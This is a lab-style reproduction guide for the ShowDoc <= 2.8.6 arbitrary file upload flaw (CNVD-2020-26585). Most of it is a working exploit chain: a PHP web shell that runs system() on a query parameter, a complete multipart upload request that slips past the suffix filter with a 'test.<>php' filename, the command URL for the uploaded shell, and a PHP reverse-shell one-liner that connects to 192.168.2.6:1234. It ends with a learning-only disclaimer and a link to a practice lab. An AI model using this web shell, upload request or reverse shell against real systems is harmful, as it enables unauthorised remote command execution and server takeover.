# ShowDoc Arbitrary File Upload (CNVD-2020-26585)

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **CVE ID** | CNVD-2020-26585 |
| **Affected Versions** | Showdoc <= 2.8.6 |
| **Vulnerability Type** | Arbitrary File Upload |
| **Severity** | 🔴 High |
| **Default Port** | 8080 |

## Vulnerability Overview

`Showdoc` is an open-source online documentation sharing tool. `Showdoc <= 2.8.6` contains an `uploadImg` file upload vulnerability caused by improper use of the `upload` method leading to inadequate file suffix restrictions. Attackers can upload arbitrary files without authorization, potentially gaining server access.

## Vulnerability Reproduction

After the target machine is started, access `http://your-ip:8080` to view the `ShowDoc` homepage.

![ShowDoc Homepage](https://static.nextcyber.cn/attachments/images/course/task/05bf4612360f422091c473237913544e.png)

The target is a `ShowDoc 2.8.2` server.

## Exploitation

First, use this [tool](https://www.realcoding tech.com/online-handling/php-reverse-shell/) to generate a remote command execution `php` file:

![Generate php file](https://static.nextcyber.cn/attachments/images/course/task/d5e86687012e4396a6fb4eb64bec7874.png)

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

```

Then capture the packet and add the above `php` file content to the data packet, then send:

```
POST /index.php?s=/home/page/uploadImg HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Length: 213

------WebKitFormBoundary0RdOKBR8AmAxfRyl
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>

------WebKitFormBoundary0RdOKBR8AmAxfRyl--

```

![Send data packet](https://static.nextcyber.cn/attachments/images/course/task/6afd4aa394684066b242477e95f55c42.png)

After successful sending, the `php` file path is returned in the data packet:

```
http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php
```

![File path](https://static.nextcyber.cn/attachments/images/course/task/8b70a48f8bd14902a9ef2e8465b51715.png)

Modify the `url` and access our uploaded remote command execution `php` file:


```
http://192.168.2.73:8080/Public/Uploads/2025-01-01/6774b03713797.php?cmd=id
```

![Execute command](https://static.nextcyber.cn/attachments/images/course/task/c4d51603124f4612bb7e221f60394163.png)

As you can see, the `id` command was executed successfully.

## Reverse Shell

Use this [tool](https://www.realcoding tech.com/online-handling/php-reverse-shell/) to generate a `php` `reverse shell` command:


```
php -r '$sock=fsockopen("192.168.2.6",1234);exec("/bin/bash <&3 >&3 2>&3");'
```

![Generate reverse shell](https://static.nextcyber.cn/attachments/images/course/task/5bdda24c22b04bb4af12385e1d2e9881.png)

Execute it directly on the webpage:

![Execute reverse shell](https://static.nextcyber.cn/attachments/images/course/task/6afd4aa394684066b242477e95f55c42.png)

Successfully obtained `shell`.

---

## Practice Lab

Practice this vulnerability online at [NextCyber Lab](https://app.nextcyber.cn/courses/148).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Do not use it for illegal activities.
